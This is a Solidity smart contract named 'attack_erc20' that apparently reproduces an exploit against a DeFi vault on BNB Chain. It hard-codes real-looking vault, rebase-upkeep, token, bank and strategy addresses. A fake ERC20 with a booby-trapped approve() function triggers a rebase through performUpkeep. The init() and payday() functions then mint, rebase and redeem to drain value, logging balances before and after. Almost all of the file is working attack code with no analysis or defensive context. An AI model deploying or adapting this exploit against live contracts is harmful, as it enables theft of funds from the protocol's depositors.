pragma solidity ^ 0.8.0;
interface IVault {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external;
}
interface IRhoToken  {
    function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);
    function mint(address account, uint256 amount) external;
    function burn(address account, uint256 amount) external;
    function setRebasingOption(bool isRebasing) external;
}
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}
interface IBANK{
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data) external;
}
interface IPerform{
    function performUpkeep(bytes calldata performData) external;
}
interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IPancakePair {
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
}
contract attack_erc20{
    address public owner;
    address public vaultAddress     = 0x4BAd4D624FD7cabEeb284a6CC83Df594bFDf26Fd;
    address public rebaseUpKeep     = 0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f;
    address public rhoAddress       = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    address public BUSDAddress      = 0x55d398326f99059fF775485246999027B3197955;
    address public Bank             = 0xbEEB9d4CA070d34c014230BaFdfB2ad44A110142;
    address public PancakeRouter    = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public PancakeFactory   = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public pair;
    address public strategy         = 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369;
    address public FLURRY           = 0x47c9BcEf4fE2dBcdf3Abf508f147f1bBE8d4fEf2;
    address public WBNB             = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;



    uint public BUSDBalanceBefore;
    uint public BUSDBalanceAfter;
    uint public rhoBefore;
    uint public rhoAfter;
    uint public Mbefore;
    uint public Mafter;
    uint public MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    
    string public name = 'fake';
    string public symbol = 'FKT';
    uint8 public decimals = 18;  
    uint256 public totalSupply = 1e28; 
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => uint256) public balanceOf;
    constructor(){
        owner = msg.sender;
        balanceOf[owner] = 1e18;
    }
    function _transfer(address _from, address _to, uint _value) internal {

        require(balanceOf[_from] >= _value);  
        require(balanceOf[_to] + _value > balanceOf[_to]);


        balanceOf[_from] -= _value; 
        balanceOf[_to] += _value;
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public returns (bool success){
        if(msg.sender == address(strategy)){
            IPerform(rebaseUpKeep).performUpkeep("0x");
        }
        allowance[msg.sender][_spender] = _value; 
        return true;
    }
    function init() public{
        require(msg.sender == owner);
        balanceOf[address(this)] = 1000000;
        IRhoToken(rhoAddress).setRebasingOption(true);
        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);
        IERC20(address(this)).approve(PancakeRouter, MAX);
        (, , uint LPamount ) = IPancakeRouter01(PancakeRouter).addLiquidity(BUSDAddress, address(this), 1000, 1000000, 0, 0, address(this), block.timestamp);
        pair = IPancakeFactory(PancakeFactory).getPair(BUSDAddress, address(this));
        IPancakePair(pair).transfer(strategy, LPamount);
        IVault(vaultAddress).mint(10000);
        IPerform(rebaseUpKeep).performUpkeep("0x");
        IVault(vaultAddress).redeem(IERC20(rhoAddress).balanceOf(address(this)));
    }
    function payday() public{
        BUSDBalanceBefore = IERC20(BUSDAddress).balanceOf(address(this));
        (Mbefore, ) = IRhoToken(rhoAddress).getMultiplier();
        IERC20(BUSDAddress).approve(vaultAddress, MAX);
        IERC20(rhoAddress).approve(vaultAddress, MAX);
        IERC20(rhoAddress).approve(PancakeRouter, MAX);
        IERC20(BUSDAddress).approve(PancakeRouter, MAX);

        IVault(vaultAddress).mint(IERC20(BUSDAddress).balanceOf(vaultAddress)*10);
        rhoBefore = IERC20(rhoAddress).balanceOf(address(this));
        IPerform(rebaseUpKeep).performUpkeep("0x");
        (Mafter,) = IRhoToken(rhoAddress).getMultiplier();
        rhoAfter = IERC20(rhoAddress).balanceOf(address(this));
        IVault(vaultAddress).redeem(rhoAfter);

        BUSDBalanceAfter = IERC20(BUSDAddress).balanceOf(address(this));
        
    }
}